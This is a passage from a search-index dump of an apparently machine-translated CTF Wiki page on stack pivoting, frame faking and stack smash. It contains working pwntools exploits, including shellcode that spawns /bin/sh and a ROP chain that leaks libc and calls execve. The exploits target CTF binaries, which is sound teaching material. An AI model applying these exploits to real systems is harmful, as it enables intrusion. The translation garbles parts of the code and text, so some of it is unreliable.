\u00b6","title":"ROP Tricks"},{"location":"pwn/linux/stackoverflow/fancy-rop/#_1","text":"","title":"\u82b1\u5f0f\u6ea2\u6ea2\u6280\u5de7"},{"location":"pwn/linux/stackoverflow/fancy-rop/#stack-pivoting","text":"","title":"stack pivoting"},{"location":"pwn/linux/stackoverflow/fancy-rop/#principle","text":"Stack pivoting, as it describes, the trick is to hijack the stack pointer to the memory that the attacker can control, and then ROP at the appropriate location. In general, we may need to use stack pivoting in the following situations. The number of bytes that can be controlled by the stack overflow is small, making it difficult to construct a long ROP chain PIE protection is enabled, the stack address is unknown, we can hijack the stack to a known area. Other vulnerabilities are difficult to exploit, we need to convert, for example, hijacking the stack to the heap space, writing rop on the heap and making heap exploits In addition, there are several requirements for using socket pivoting. You can control the flow of program execution. You can control the sp pointer. In general, the control stack pointer will use ROP, and the common control stack pointers are usually gadgets. ` asm pop rsp/esp Of course, there will be some other postures. For example, gadgets in libc_csu_init, we can get the control rsp pointer by offset. The above is normal, the bottom is offset. `` `asm gef\u27a4 x/7i 0x000000000040061a 0x40061a <__libc_csu_init+90>: pop rbx 0x40061b <__libc_csu_init+91>: pop rbp 0x40061c <__libc_csu_init+92>: pop r12 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 &lt;__ libc_csu_init + 100&gt;: right gef\u27a4 x/7i 0x000000000040061d 0x40061d <__libc_csu_init+93>: pop rsp 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 &lt;__ libc_csu_init + 100&gt;: right In addition, there are more advanced fake frames. There is memory that can control the content, generally as follows bss segment. Since the process allocates memory by page, the memory allocated to the bss segment is at least one page (4k, 0x1000) in size. However, the contents of the general bss section do not use so much space, and the memory pages allocated by the bss section have read and write permissions. heap. But this requires us to be able to reveal the heap address.","title":"Principle"},{"location":"pwn/linux/stackoverflow/fancy-rop/#example","text":"","title":"example"},{"location":"pwn/linux/stackoverflow/fancy-rop/#example-1","text":"Here we take [X-CTF Quals 2016 - b0verfl0w] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20- % 20b0verfl0w) is introduced as an example. First, check the security of the program, as follows \u279c X-CTF Quals 2016 - b0verfl0w git: ( iromise ) \u2717 checksec b0verfl0w Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE ( 0x8048000 ) RWX: Has RWX segments It can be seen that the source program is 32-bit and NX protection is not enabled. Let's look for the vulnerability of the program. signed int vul () { char s ; // [sp+18h] [bp-20h]@1 puts ( \" \\n ======================\" ); puts ( \" \\n Welcome to X-CTF 2016!\" ); puts ( \" \\n ======================\" ); puts ( \"What's your name?\" ); fflush ( stdout ); fgets ( & s , 50 , stdin ); printf ( \"Hello %s.\" , & s ); fflush ( stdout ); return 1 ; } As you can see, there is a stack overflow vulnerability in the source program. But the only bytes that can overflow are only 50-0x20-4=14 bytes, so it is difficult to implement some better ROPs. Here we consider stack pivoting. Since the program itself does not have stack protection turned on, we can lay out shellcode on the stack and execute it. Basic use ideas are as follows Layout shellcode with stack overflow Control eip to point to shellcode The first step is still relatively easy to read directly, but since the program itself will open ASLR protection, it is difficult to directly know the address of the shellcode. But the relative offset on the stack is fixed, so we can use the stack overflow to operate on the esp to point to the shellcode and directly control the program to jump to the esp. The following is to find the control program to jump to the gadgets at the esp. \u279c X-CTF Quals 2016 - b0verfl0w git: ( iromise ) \u2717 ROPgadget --binary b0verfl0w --only 'jmp|ret' Gadgets information ============================================================ 0x08048504 : jmp esp 0x0804836a: right 0x0804847e: right 0xeac1 Unique gadgets found: 3 Here we find that there is a gadget that can jump directly to esp. Then we can lay out the payload as follows shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp Then the last part of our payload changes how to set esp, you can know size(shellcode+padding)=0x20 size(fake ebp)=0x4 size(0x08048504)=0x4 So the last step we need to execute is ` asm sub esp,0x28 jmp esp So the last exp is as follows ```python from pwn import * sh = process('./b0verfl0w') shellcode_x86 = \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\" shellcode_x86 += \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\" shellcode_x86 += \"\\x0b\\xcd\\x80\" sub_esp_jmp = asm('sub esp, 0x28;jmp esp') jmp_esp = 0x08048504 payload = shellcode_x86 + ( 0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp sh.sendline(payload) sh.interactive()","title":"Example 1"},{"location":"pwn/linux/stackoverflow/fancy-rop/#example-2-transfer-heap","text":"Wait.","title":"Example 2 - Transfer heap"},{"location":"pwn/linux/stackoverflow/fancy-rop/#title","text":"EkoPartyCTF 2016 fuckzing-exploit-200","title":"Title"},{"location":"pwn/linux/stackoverflow/fancy-rop/#frame-faking","text":"As the name suggests, this technique constructs a fake stack frame to control the execution flow of the program.","title":"frame faking"},{"location":"pwn/linux/stackoverflow/fancy-rop/#principle_1","text":"In a nutshell, the stack overflow we talked about before is nothing more than two ways. Control program EIP Control program EBP It ends up being the execution flow of the control program. In frame faking, the trick we use is to control both EBP and EIP, so that we control the execution flow of the program and also change the position of the stack frame. Generally its payload is as follows buffer padding|fake ebp|leave ret addr| That is, we use stack overflow to construct the stack as above. Here we mainly talk about the next two parts The return address of the function is overwritten by us to execute the address of the leave ret, which indicates that the function will perform a leave ret again after it has successfully executed its own leave ret. where fake ebp is the base address of the stack frame we constructed. Note that this is an address. In general, we construct a fake stack frame as follows fake ebp | v ebp2|target function addr|leave ret addr|arg1|arg2 Here our fake ebp points to ebp2, which is the address where ebp2 is located. Generally speaking, this is all readable content that we can control. The following assembly syntax is the intel syntax. Before we introduce the basic control process, we still need to talk about the basic operation of the entry and exit points of the function. Entry point Push ebp # push ebp Mov ebp, esp # assign the value of esp to ebp Exit point leave Ret #pop eip, pop the top element of the stack as the next execution address of the program Where the leave command is equivalent Mov esp, ebp # assign the value of ebp to esp Pop ebp # pop ebp Let's take a closer look at the basic control process. When a program with a stack overflow performs leave, it is divided into two steps. mov esp, ebp , which will also point esp to the ebp base address of the current stack overflow vulnerability. pop ebp, which assigns the value of fake ebp stored in the stack to ebp. That is, after executing the instruction, ebp points to ebp2, which is the address where ebp2 is stored. Execute the ret instruction and execute the leave ret instruction again. Execute the leave command, which is divided into two steps mov esp, ebp , which points esp to ebp2. pop ebp, in which case the content of ebp will be set to the value of ebp2, and esp will point to the target function. Execute the ret instruction, at which time the program will execute the target function and execute it when it is running the program. push ebp, which pushes the ebp2 value onto the stack. mov ebp, esp, points ebp to the current base address. The stack structure at this time is as follows ebp | v ebp2 | leave ret addr | arg1 | arg2 When the program is executed, it will apply for space normally. At the same time, we also arrange the parameters corresponding to the function on the stack, so the program will execute normally. After the program ends, it will execute leave ret addr twice, so if we have the corresponding content arranged at ebp2, then we can always control the execution flow of the program. It can be seen that in the fake frame, we have a requirement that we have to have a memory that can be written, and we also know the address of this memory, which is similar to stack pivoting.","title":"Principle"},{"location":"pwn/linux/stackoverflow/fancy-rop/#2018-over","text":"Take the over one of the An Heng Cup monthly competition in June 2018 as an example. The title can be found in [ctf-challenge] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow Found in /fake_frame/over)","title":"2018 \u5b89\u6052\u676fover"},{"location":"pwn/linux/stackoverflow/fancy-rop/#file-information","text":"over.over: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 99beb778a74c68e4ce1477b559391e860dd0e946, stripped [ * ] '/home/m4x/pwn_repo/others_over/over.over' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled FOOT: No FOOT 64-bit dynamically linked program, without PIE and canary protection, but opened NX protection","title":"File Information"},{"location":"pwn/linux/stackoverflow/fancy-rop/#_2","text":"Put it in IDA for analysis __int64 __fastcall main ( __int64 a1 , char ** a2 , char ** a3 ) { setvbuf ( stdin , 0L L , 2 , 0L L ); setvbuf ( stdout , 0L L , 2 , 0L L ); while ( sub_400676 () ) ; return 0L L ; } int sub_400676 () { char buf [ 80 ]; // [rsp+0h] [rbp-50h] memset ( buf , 0 , sizeof ( buf )); putchar ( '>' ); read ( 0 , buf , 96uLL ); return puts ( buf ); } The vulnerability is obvious, read can read 96 bits, but the length of buf is only 80, so it can cover rbp and ret addr but can only cover rbp and ret addr, so it can only be controlled by controlling rbp and ret addr at the same time. Up","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"pwn/linux/stackoverflow/fancy-rop/#leak-stack","text":"In order to control rbp, we need to know some addresses. We can find that when the input length is 80, since read does not add '\\0' to the end of the input, the value of rbp will be printed by puts, so that we can Know the address of all locations on the stack by a fixed offset Breakpoint 1 , 0x00000000004006b9 in ?? () LEGEND : STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ REGISTERS ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) RBX 0x0 RCX 0x7ff756e9b690 ( __read_nocancel + 7 ) \u25c2\u2014 cmp rax , -0xfff RDX 0x60 RDI 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) RSI 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) R8 0x7ff75715b760 ( _IO_stdfile_1_lock ) \u25c2\u2014 0x0 R9 0x7ff757354700 \u25c2 - 0x7ff757354700 R10 0x37b R11 0x246 R12 0x400580 \u25c2\u2014 xor ebp , ebp R13 0x7ffceaf112b0 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0x7ffceaf111b0 \u2014\u25b8 0x7ffceaf111d0 \u2014\u25b8 0x400730 \u25c2\u2014 push r15 RSP 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) RIP 0x4006b9 \u25c2\u2014 call 0x400530 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ DISASM ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x4006b9 call puts @ plt < 0x400530 > s : 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) 0x4006be leave 0x4006bf right 0x4006c0 push rbp 0x4006c1 mov rbp , rsp 0x4006c4 sub rsp , 0x10 0x4006c8 mov dword ptr [ rbp - 4 ], edi 0x4006cb mov qword for [ rbp - 0x10 ], rsi 0x4006cf mov rax , qword ptr [ rip + 0x20098a ] < 0x601060 > 0x4006d6 mov ecx , 0 0x4006db mov edx , 2 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ STACK ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 00 : 0000 \u2502 rax rdi rsi rsp 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) ... \u2193 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ BACKTRACE ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba f 0 4006 b9 f 1 400715 f 2 7f f756de02b1 __libc_start_main + 241 Breakpoint * 0x4006B9 pwndbg > stack 15 00 : 0000 \u2502 rax rdi rsi rsp 0x7ffceaf11160 \u25c2\u2014 0x3030303030303030 ( ' 00000000 ' ) ... \u2193 0 a : 0050 \u2502 rbp 0x7ffceaf111b0 \u2014\u25b8 0x7ffceaf111d0 \u2014\u25b8 0x400730 \u25c2\u2014 push r15 0 b : 005 8 \u2502 0x7ffceaf111b8 \u2014\u25b8 0x400715 \u25c2\u2014 test eax , eax 0 c : 0060 \u2502 0x7ffceaf111c0 \u2014\u25b8 0x7ffceaf112b8 \u2014\u25b8 0x7ffceaf133db \u25c2\u2014 ' . / over . over ' 0 d : 006 8 \u2502 0x7ffceaf111c8 \u25c2\u2014 0x100000000 0 e : 0070 \u2502 0x7ffceaf111d0 \u2014\u25b8 0x400730 \u25c2\u2014 push r15 pwndbg > distance 0x7ffceaf111d0 0x7ffceaf11160 0x7ffceaf111d0 -> 0x7ffceaf11160 is -0x70 bytes ( -0xe words ) After leaking the stack address, we can control the program flow by controlling rbp as the address on the stack (such as 0x7ffceaf11160) and ret addr as the address of leave ret. For example, we can fill in the rop chain of the leak libc at 0x7ffceaf11160 + 0x8 and control it back to the sub_400676 function to leak libc. \u200b Then on the next use, you can use the rop to execute system(&quot;/bin/sh&quot;) or execve(&quot;/bin/sh&quot;, 0, 0) to get the shell. This question is because the input is long enough. , we can arrange the use chain of execve(&quot;/bin/sh&quot;, 0, 0) , this method is more secure ( system(&quot;/bin/sh&quot;) may be invalidated due to env destruction) , but because the structure of the stack changes during the process, some key offsets need to be determined by debugging.","title":"leak stack"},{"location":"pwn/linux/stackoverflow/fancy-rop/#exp","text":"from pwn import * context . binary = \"./over.over\" def DEBUG ( cmd ): raw_input ( \"DEBUG: \" ) gdb . attach ( io , cmd ) io = process ( \"./over.over\" ) eleven = ELF ( & quot ; ./ over . over & quot ;) libc = elf . libc io . sendafter ( \">\" , 'a' * 80 ) stack = u64 ( io . recvuntil ( & quot ; x7f & quot ;) [ - 6 :] . light ( 8 , & #39;0&#39;)) - 0x70 success ( \"stack -> {:#x} \" . format ( stack )) # DEBUG(\"b *0x4006B9\\nc\") io . sendafter ( \">\" , flat ([ '11111111' , 0x400793 , elf . got [ 'puts' ], elf . plt [ 'puts' ], 0x400676 , ( 80 - 40 ) * '1' , stack , 0x4006be ])) libc . address = u64 ( io . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - libc . sym [ 'puts' ] success ( \"libc.address -> {:#x} \" . format ( libc . address )) pop_rdi_ret = 0x400793 ''' $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop | ret&quot; 0x00000000000f5279 : pop rdx ; pop rsi ; ret ''' pop_rdx_pop_rsi_ret = libc . address + 0xf5279 payload = flat ([ '22222222' , pop_rdi_ret , next ( libc . search ( \"/bin/sh\" )), pop_rdx_pop_rsi_ret , p64 ( 0 ), p64 ( 0 ), libc . sym [ 'execve' ], ( 80 - 7 * 8 ) * '2' , stack - 0x30 , 0x4006be ]) io . sendafter ( \">\" , payload ) io . interactive () In general, this method is not very different from the stack pivot.","title":"exp"},{"location":"pwn/linux/stackoverflow/fancy-rop/#reference-reading","text":"http://www.xfocus.net/articles/200602/851.html http://phrack.org/issues/58/4.html","title":"Reference reading"},{"location":"pwn/linux/stackoverflow/fancy-rop/#stack-smash","text":"","title":"Stack smash"},{"location":"pwn/linux/stackoverflow/fancy-rop/#principle_2","text":"After the program is added with canary protection, if the buffer we read overwrites the corresponding value, the program will report an error, and generally we will not care about the error message. The stack smash trick is to use the program that prints this information to get what we want. This is because after the program starts canary protection, if the canary is found to be modified, the program will execute the __stack_chk_fail function to print the string pointed to by the argv[0] pointer. Normally, this pointer points to the program name. Its code is as follows void __attribute__ (( noreturn )) __stack_chk_fail ( void ) { __fortify_fail ( \"stack smashing detected\" ); } void __attribute__ (( noreturn )) internal_function __fortify_fail ( const char * msg ) { /* The loop is added only to keep gcc happy. */ while ( 1 ) __libc_message ( 2 , \"*** %s ***: %s terminated \\n \" , msg , __libc_argv [ 0 ] ?: \"<unknown>\" ); } So if we use stack overflow to override argv[0] for the address of the string we want to output, then we will output the information we want in the __fortify_fail function.","title":"Principle"},{"location":"pwn/linux/stackoverflow/fancy-rop/#32c3-ctf-readme","text":"Here, we introduce the 2015 32C3 CTF readme as an example, which is reproduced on jarvisoj.","title":"32C3 CTF readme"},{"location":"pwn/linux/stackoverflow/fancy-rop/#determining-protection","text":"It can be seen that the program is 64-bit, mainly enabling Canary protection and NX protection, as well as FORTIFY protection. \u279c stacksmashes git: ( master ) \u2717 checksec smashes Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) FORTIFY: Enabled","title":"Determining protection"},{"location":"pwn/linux/stackoverflow/fancy-rop/#_3","text":"Ida look __int64 sub_4007E0 () { __int64 v0 ; // rax @ 1 __int64 v1 ; // rbx@2 int v2 ; // eax@3 __int64 v4 ; // [sp + 0h] [bp-128h] @ 1 __int64 v5 ; // [sp+108h] [bp-20h]@1 v5 = * MK_FP ( __FS__ , 40L L ); __printf_chk ( 1L L , ( __int64 ) \"Hello! \\n What's your name? \" ); LODWORD ( v0 ) = _IO_gets (( __ int64 ) & amp ; v4 ); if ( ! v0 ) LABEL_9 : _exit ( 1 ); v1 = 0L L ; __printf_chk ( 1L L , ( __int64 ) \"Nice to meet you, %s. \\n Please overwrite the flag: \" ); while ( 1 ) { v2 = _IO_getc ( stdin ); if ( v2 == -1 ) goto LABEL_9 ; if ( v2 == '\\n' ) break ; byte_600D20 [ v1 ++ ] = v2 ; if ( v1 == ' ' ) goto LABEL_8 ; } memset (( void * )(( signed int ) v1 + 0x600D20LL ), 0 , ( unsigned int )( 32 - v1 )); LABEL_8 : puts ( \"Thank you, bye!\" ); return * MK_FP ( __FS__ , 40L L ) ^ v5 ; } Obviously, the program has a stack overflow in _IO_gets((__int64)&amp;v4) ; In addition, the program also prompts to overwrite the flag. And found that the program is very interesting to execute this statement after the while loop memset (( void * )(( signed int ) v1 + 0x600D20LL ), 0 , ( unsigned int )( 32 - v1 )); Looking at the contents of the corresponding address, you can find the following content, indicating that the flag of the program is here. .data:0000000000600D20 ; char aPctfHereSTheFl[] .data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0 But if we directly use the stack overflow to output the contents of the address is not feasible, this is because the content we read byte_600D20[v1++] = v2; is exactly the block memory, which will directly overwrite it, this We need to use a skill. When ELF memory maps, the bss section is mapped twice, so we can use another address for output, which can be found using gdb's find.","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"pwn/linux/stackoverflow/fancy-rop/#determine-the-flag-address","text":"We download the breakpoint from the memset function and read the corresponding content as follows ` asm gef\u27a4 c Continuing. Hello! What's your name? qqqqqqq Nice to meet you, qqqqqqq. Please overwrite the flag: 222222222 Breakpoint 1, __memset_avx2 () at ../sysdeps/x86_64/multiarch/memset-avx2.S:38 38 ../sysdeps/x86_64/multiarch/memset-avx2.S: There is no such file or directory. \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x7ffff7b7f920 <__memset_chk_avx2+0> cmp rcx, rdx 0x7ffff7b7f923 <__memset_chk_avx2+3> jb 0x7ffff7b24110 <__GI___chk_fail> 0x7ffff7b7f929 nop DWORD PTR [rax+0x0] \u2192 0x7ffff7b7f930 <__memset_avx2+0> vpxor xmm0, xmm0, xmm0 0x7ffff7b7f934 <__memset_avx2+4> vmovd xmm1, esi 0x7ffff7b7f938 <__memset_avx2+8> lea rsi, [rdi+rdx*1] 0x7ffff7b7f93c <__memset_avx2+12> mov rax, rdi \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0x7fffffffda38', 'l8'] 8 0x00007fffffffda38\u2502+0x00: 0x0000000000400878 \u2192 mov edi, 0x40094e \u2190 $rsp 0x00007fffffffda40\u2502+0x08: 0x0071717171717171 (\"qqqqqqq\"?) 0x00007fffffffda48\u2502+0x10: 0x0000000000000000 0x00007fffffffda50\u2502+0x18: 0x0000000000000000 0x00007fffffffda58\u2502+0x20: 0x0000000000000000 0x00007fffffffda60\u2502+0x28: 0x0000000000000000 0x00007fffffffda68\u2502+0x30: 0x0000000000000000 0x00007fffffffda70\u2502+0x38: 0x0000000000000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 [#0] 0x7ffff7b7f930 \u2192 Name: __memset_avx2() [# 1] 0x400878 \u2192 mov edi, 0x40094e \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 find 22222 Argument required (expression to compute). gef\u27a4 find '22222' No symbol \"22222\" in current context. given grip '22222' [+] Searching '22222' in memory [+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x600000-0x601000), permission=rw- 0x600d20 - 0x600d3f \u2192 \"222222222's the flag on server}\" [+] In '[heap]'(0x601000-0x622000), permission=rw- 0x601010 - 0x601019 \u2192 \"222222222\" donated PCTF [+] Searching 'PCTF' in memory [+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x400000-0x401000), permission=r-x 0x400d20 - 0x400d3f \u2192 \"PCTF{Here's the flag on server}\" It can be seen that the 2222 we read has covered the flag at 0x600d20, but we still find the backup of this flag at 0x400d20 in memory, so we can still output it. Here we have determined the address of the flag. #### Determining the offset Next, we determine the offset of the string read by argv[0]. First break the breakpoint at the main function entry, as follows `` `asm gef\u27a4 b *0x00000000004006D0 Breakpoint 1 at 0x4006d0 gef\u27a4 r Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes Breakpoint 1, 0x00000000004006d0 in ?? () code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x4006c0 <_IO_gets@plt+0> jmp QWORD PTR [rip+0x20062a] # 0x600cf0 <_IO_gets@got.plt> 0x4006c6 <_IO_gets@plt+6> push 0x9 0x4006cb <_IO_gets@plt+11> jmp 0x400620 \u2192 0x4006d0 sub rsp, 0x8 0x4006d4 mov rdi, QWORD PTR [rip + 0x200665] # 0x600d40 <stdout> 0x4006db xi, oh 0x4006dd call 0x400660 <setbuf@plt> \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0x7fffffffdb78', 'l8'] 8 0x00007fffffffdb78\u2502+0x00: 0x00007ffff7a2d830 \u2192 <__libc_start_main+240> mov edi, eax \u2190 $rsp 0x00007fffffffdb80\u2502+0x08: 0x0000000000000000 0x00007fffffffdb88\u2502+0x10: 0x00007fffffffdc58 \u2192 0x00007fffffffe00b \u2192 \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/exam[...]\" 0x00007fffffffdb90\u2502+0x18: 0x0000000100000000 0x00007fffffffdb98\u2502+0x20: 0x00000000004006d0 \u2192 sub rsp, 0x8 0x00007fffffffdba0\u2502+0x28: 0x0000000000000000 0x00007fffffffdba8\u2502+0x30: 0x48c916d3cf726fe3 0x00007fffffffdbb0\u2502+0x38: 0x00000000004006ee \u2192 xor ebp, ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 [#0] 0x4006d0 \u2192 sub rsp, 0x8 [#1] 0x7ffff7a2d830 \u2192 Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdc48) ---Type <return> to continue, or q <return> to quit--- [# 2] 0x400717 \u2192 holds It can be seen that 0x00007fffffffe00b points to the program name, which is naturally argv[0], so the content we modified is this address. At the same time, the address is kept at 0x00007fffffffdc58, so the address we really need is 0x00007fffffffdc58. Also, according to the assembly code ` asm .text:00000000004007E0 push rbp .text:00000000004007E1 mov esi, offset aHelloWhatSYour ; \"Hello!\\nWhat's your name? \" .text:00000000004007E6 mov edi, 1 .text:00000000004007EB push rbx .text:00000000004007EC sub rsp, 118h .text:00000000004007F3 mov rax, fs:28h .text:00000000004007FC mov [rsp+128h+var_20], rax .text:0000000000400804 xor eax, eax .text:0000000000400806 call ___printf_chk .text:000000000040080B mov rdi, rsp .text:000000000040080E call __IO_gets We can make sure that the starting address of the string we read is actually the rsp 